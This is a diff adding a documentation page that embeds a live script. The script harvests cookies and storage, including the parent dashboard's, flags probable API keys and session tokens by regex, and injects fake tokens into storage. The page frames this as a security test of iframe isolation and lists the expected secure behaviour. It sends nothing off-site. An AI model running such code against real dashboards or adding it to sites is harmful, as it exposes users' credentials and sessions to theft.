@@ -1,0 +1,299 @@
+---
+title: "Storage & Cookie Access Tests"
+description: "Local storage, session storage, and cookie access tests"
+icon: "database"
+---
+
+# Storage & Cookie Access Tests
+
+This test evaluates access to various storage mechanisms and cookies, which may contain sensitive data like API keys, session tokens, and user credentials.
+
+<script>
+  {`
+console.log('🍪 STORAGE & COOKIE ACCESS TEST STARTED');
+
+// Test 1: Cookie enumeration and access
+console.log('--- TEST 1: Cookie Enumeration ---');
+try {
+  console.log('Document cookies:', document.cookie);
+  
+  if (document.cookie) {
+    const cookies = document.cookie.split(';').map(cookie => {
+      const [name, value] = cookie.trim().split('=');
+      return { name, value };
+    });
+    
+    console.log('Parsed cookies:', cookies);
+    
+    // Look for potential API keys or tokens in cookies
+    const suspiciousCookies = cookies.filter(cookie => 
+      /api|key|token|auth|session|jwt/i.test(cookie.name) || 
+      /^[a-zA-Z0-9+/]{20,}={0,2}$/.test(cookie.value) // Base64-like pattern
+    );
+    
+    if (suspiciousCookies.length > 0) {
+      console.log('🚨 POTENTIAL API KEYS/TOKENS FOUND IN COOKIES:', suspiciousCookies);
+    }
+  } else {
+    console.log('No cookies accessible from iframe context');
+  }
+} catch (e) {
+  console.log('❌ Cookie access blocked:', e.message);
+}
+
+// Test 2: Parent window cookie access
+console.log('--- TEST 2: Parent Cookie Access ---');
+try {
+  if (window.parent && window.parent.document) {
+    console.log('✅ Parent cookies accessible:', window.parent.document.cookie);
+    
+    if (window.parent.document.cookie) {
+      const parentCookies = window.parent.document.cookie.split(';').map(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        return { name, value };
+      });
+      
+      console.log('🎯 PARENT DASHBOARD COOKIES:', parentCookies);
+    }
+  }
+} catch (e) {
+  console.log('❌ Parent cookie access blocked:', e.message);
+}
+
+// Test 3: localStorage enumeration
+console.log('--- TEST 3: LocalStorage Enumeration ---');
+try {
+  console.log('LocalStorage keys:', Object.keys(localStorage));
+  
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    const value = localStorage.getItem(key);
+    localStorageData[key] = value;
+    
+    // Check for API keys or sensitive data
+    if (/api|key|token|auth|secret|password/i.test(key) || 
+        /^[a-zA-Z0-9+/]{20,}={0,2}$/.test(value)) {
+      console.log('🚨 POTENTIAL SENSITIVE DATA IN LOCALSTORAGE:', { key, value });
+    }
+  }
+  
+  console.log('LocalStorage contents:', localStorageData);
+} catch (e) {
+  console.log('❌ LocalStorage access blocked:', e.message);
+}
+
+// Test 4: Parent localStorage access
+console.log('--- TEST 4: Parent LocalStorage Access ---');
+try {
+  if (window.parent && window.parent.localStorage) {
+    console.log('Parent localStorage keys:', Object.keys(window.parent.localStorage));
+    
+    const parentLocalStorage = {};
+    for (let i = 0; i < window.parent.localStorage.length; i++) {
+      const key = window.parent.localStorage.key(i);
+      const value = window.parent.localStorage.getItem(key);
+      parentLocalStorage[key] = value;
+      
+      // Look for dashboard API keys
+      if (/mintlify|api|key|token|dashboard|auth/i.test(key)) {
+        console.log('🎯 POTENTIAL DASHBOARD API KEY:', { key, value });
+      }
+    }
+    
+    console.log('✅ PARENT DASHBOARD LOCALSTORAGE ACCESSED:', parentLocalStorage);
+  }
+} catch (e) {
+  console.log('❌ Parent localStorage access blocked:', e.message);
+}
+
+// Test 5: sessionStorage enumeration
+console.log('--- TEST 5: SessionStorage Enumeration ---');
+try {
+  console.log('SessionStorage keys:', Object.keys(sessionStorage));
+  
+  const sessionStorageData = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    const value = sessionStorage.getItem(key);
+    sessionStorageData[key] = value;
+    
+    if (/api|key|token|auth|session/i.test(key)) {
+      console.log('🚨 POTENTIAL SESSION DATA:', { key, value });
+    }
+  }
+  
+  console.log('SessionStorage contents:', sessionStorageData);
+} catch (e) {
+  console.log('❌ SessionStorage access blocked:', e.message);
+}
+
+// Test 6: Parent sessionStorage access
+console.log('--- TEST 6: Parent SessionStorage Access ---');
+try {
+  if (window.parent && window.parent.sessionStorage) {
+    const parentSessionStorage = {};
+    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
+      const key = window.parent.sessionStorage.key(i);
+      const value = window.parent.sessionStorage.getItem(key);
+      parentSessionStorage[key] = value;
+    }
+    
+    console.log('✅ PARENT SESSION STORAGE ACCESSED:', parentSessionStorage);
+  }
+} catch (e) {
+  console.log('❌ Parent sessionStorage access blocked:', e.message);
+}
+
+// Test 7: IndexedDB enumeration
+console.log('--- TEST 7: IndexedDB Access ---');
+try {
+  if ('indexedDB' in window) {
+    // This is a more complex async operation, but we can attempt it
+    const databaseRequest = indexedDB.webkitGetDatabaseNames ? 
+      indexedDB.webkitGetDatabaseNames() : null;
+    
+    if (databaseRequest) {
+      databaseRequest.onsuccess = function(event) {
+        console.log('IndexedDB databases:', Array.from(event.target.result));
+      };
+    } else {
+      console.log('IndexedDB database enumeration not available');
+    }
+    
+    console.log('✅ IndexedDB access available');
+  }
+} catch (e) {
+  console.log('❌ IndexedDB access blocked:', e.message);
+}
+
+// Test 8: Cache storage access
+console.log('--- TEST 8: Cache Storage Access ---');
+try {
+  if ('caches' in window) {
+    caches.keys().then(cacheNames => {
+      console.log('Available caches:', cacheNames);
+      
+      // Try to access cached data
+      cacheNames.forEach(cacheName => {
+        caches.open(cacheName).then(cache => {
+          cache.keys().then(requests => {
+            console.log(\`Cache '\${cacheName}' contains:\`, requests.map(req => req.url));
+          });
+        });
+      });
+    }).catch(e => {
+      console.log('❌ Cache access error:', e.message);
+    });
+    
+    console.log('✅ Cache Storage API available');
+  }
+} catch (e) {
+  console.log('❌ Cache Storage blocked:', e.message);
+}
+
+// Test 9: WebSQL access (deprecated but might still exist)
+console.log('--- TEST 9: WebSQL Access ---');
+try {
+  if ('openDatabase' in window) {
+    console.log('✅ WebSQL available (deprecated)');
+    
+    const db = openDatabase('test', '1.0', 'Test DB', 2 * 1024 * 1024);
+    if (db) {
+      console.log('WebSQL database opened');
+    }
+  } else {
+    console.log('WebSQL not available');
+  }
+} catch (e) {
+  console.log('❌ WebSQL access blocked:', e.message);
+}
+
+// Test 10: Storage persistence and data injection
+console.log('--- TEST 10: Storage Data Injection ---');
+try {
+  // Try to inject malicious data into various storage mechanisms
+  localStorage.setItem('iframe_injected_api_key', 'sk-fake-api-key-from-iframe-12345');
+  sessionStorage.setItem('iframe_session_hijack', JSON.stringify({
+    user_id: 'hijacked_user',
+    api_token: 'injected_token',
+    timestamp: Date.now()
+  }));
+  
+  document.cookie = 'iframe_injected=malicious_value; path=/';
+  
+  console.log('✅ Storage injection successful');
+  
+  // Clean up after 3 seconds
+  setTimeout(() => {
+    localStorage.removeItem('iframe_injected_api_key');
+    sessionStorage.removeItem('iframe_session_hijack');
+    document.cookie = 'iframe_injected=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/';
+    console.log('🧹 Storage injection cleaned up');
+  }, 3000);
+  
+} catch (e) {
+  console.log('❌ Storage injection blocked:', e.message);
+}
+
+// Visual indicator
+const indicator = document.createElement('div');
+indicator.innerHTML = '🍪 STORAGE ACCESS TEST ACTIVE';
+indicator.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; background: #dc2626; color: white; text-align: center; padding: 10px; z-index: 9999; font-weight: bold;';
+document.body.insertBefore(indicator, document.body.firstChild);
+
+setTimeout(() => {
+  indicator.remove();
+  console.log('🍪 STORAGE & COOKIE ACCESS TEST COMPLETED');
+}, 6000);
+`}
+</script>
+
+## What This Test Does
+
+This storage and cookie test attempts to access sensitive data through:
+
+1. **Cookie Enumeration** - Reading all accessible cookies and identifying potential API keys
+2. **Parent Cookie Access** - Attempting to read cookies from the parent dashboard
+3. **localStorage Scanning** - Enumerating and analyzing local storage for sensitive data
+4. **Parent localStorage** - Accessing dashboard's local storage (where API keys might be stored)
+5. **sessionStorage Analysis** - Checking session data for authentication tokens
+6. **Parent sessionStorage** - Accessing parent window's session storage
+7. **IndexedDB Access** - Attempting to access client-side databases
+8. **Cache Storage** - Checking browser cache for sensitive cached requests
+9. **WebSQL Access** - Testing deprecated but potentially present storage
+10. **Data Injection** - Injecting malicious data into storage mechanisms
+
+## Critical Security Implications
+
+For a dashboard hosting iframes, this test checks if:
+
+- **Dashboard API keys stored in localStorage are accessible** 🚨
+- **Session tokens in cookies can be read** 🚨
+- **Authentication data is isolated between contexts** ✅
+- **Malicious data can be injected into parent storage** 🚨
+
+<Callout type="error">
+  **CRITICAL**: If this test successfully accesses parent localStorage/cookies
+  containing API keys, it represents a **severe security vulnerability** that
+  could lead to complete account compromise.
+</Callout>
+
+## Expected Secure Behavior
+
+In a properly secured iframe:
+
+- Cross-origin storage access should be **blocked**
+- Parent window storage should be **inaccessible**
+- Only same-origin storage should be readable
+- Storage injection should be **limited to iframe scope**
+
+## Dashboard-Specific Risks
+
+If API keys are accessible, an attacker could:
+
+- **Steal Mintlify API keys** and access/modify documentation
+- **Impersonate the user** in API calls
+- **Access billing information** and usage data
+- **Modify project settings** and configurations
+- **Delete or corrupt documentation** projects
